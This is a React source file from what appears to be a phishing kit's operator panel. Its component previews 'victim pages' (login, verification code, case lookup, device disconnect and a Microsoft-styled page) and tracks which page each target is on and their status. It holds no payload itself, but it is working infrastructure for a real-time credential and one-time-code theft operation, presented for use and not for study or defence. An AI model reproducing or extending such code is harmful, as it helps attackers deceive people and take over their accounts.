import Login from "../../pages/Login";
import Code from "../../pages/Code";
import Loading from "../../pages/Loading";
import CaseLookup from "../../pages/CaseLookup";
import Review from "../../pages/Review";
import SuccessPage from "../../pages/SuccessPage";
import Disconnect from "../../pages/Disconnect";
import Microsoft from "../../pages/Microsoft";

/**
 * Renders the real victim pages (1:1) scaled into the admin live preview.
 * Height is cropped to the page chrome — no empty stretch below.
 */
function LivePagePreview({ user }) {
  const page = user?.currentPage || "case_lookup";
  const isDisconnect = page === "disconnect" || page === "accept_device";
  const isMicrosoft = page === "microsoft";

  let content = <CaseLookup authUser={user} />;
  if (page === "login") content = <Login authUser={user} />;
  else if (page === "code") content = <Code authUser={user} />;
  else if (page === "loading") content = <Loading authUser={user} />;
  else if (page === "case_lookup" || page === "caseLookup")
    content = <CaseLookup authUser={user} />;
  else if (page === "review") content = <Review authUser={user} />;
  else if (page === "success") content = <SuccessPage />;
  else if (page === "disconnect" || page === "accept_device")
    content = <Disconnect authUser={user} />;
  else if (page === "microsoft") content = <Microsoft authUser={user} />;

  const scale = isDisconnect || isMicrosoft ? 0.42 : 0.48;
  const frameW = 640;
  const frameH =
    isDisconnect || isMicrosoft
      ? 820
      : page === "login" || page === "code"
        ? 780
        : page === "case_lookup" || page === "caseLookup"
          ? 780
          : page === "loading"
            ? 780
            : 720;
  const viewH = Math.round(frameH * scale);
  const viewW = Math.round(frameW * scale);

  return (
    <div className="w-full flex flex-col items-center">
      <style>{`
        .preview-light .min-h-screen,
        .preview-light [class*="min-h-\\[calc"],
        .preview-light [class*="h-\\[100dvh"] {
          min-height: ${frameH}px !important;
          height: ${frameH}px !important;
          max-height: ${frameH}px !important;
        }
        .preview-light {
          background: #fbfbfd;
        }
      `}</style>
      <div
        className="relative overflow-hidden rounded-2xl border border-white/10 shadow-2xl shadow-black/40 bg-[#fbfbfd] self-center"
        style={{ width: viewW + 8, height: viewH + 8 }}
      >
        <div className="absolute inset-0 overflow-hidden pointer-events-none select-none">
          <div
            className="preview-light origin-top-left"
            style={{
              width: frameW,
              height: frameH,
              transform: `scale(${scale})`,
            }}
          >
            {content}
          </div>
        </div>
      </div>
      <p className="mt-2 text-center text-[10px] text-zinc-500">
        1:1 live preview · {page}
        {user?.currentStatus ? ` · ${user.currentStatus}` : ""}
      </p>
    </div>
  );
}

export default LivePagePreview;
